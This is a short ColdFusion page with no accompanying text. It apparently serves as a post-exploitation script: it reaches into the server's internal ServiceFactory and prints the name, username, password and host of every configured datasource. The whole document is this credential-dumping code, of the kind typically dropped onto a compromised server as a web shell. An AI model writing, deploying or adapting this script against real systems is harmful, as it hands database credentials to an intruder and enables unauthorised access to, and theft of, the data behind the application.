<cfset svc=createObject("java","coldfusion.server.ServiceFactory").getDataSourceService()>
<cfset dsns=svc.getDatasources()>
<cfloop collection="#dsns#" item="n">
<cfset d=dsns[n]>
<cfoutput>#n#|#d.username#|#d.password#|#d.urlmap.host#
</cfoutput>
</cfloop>
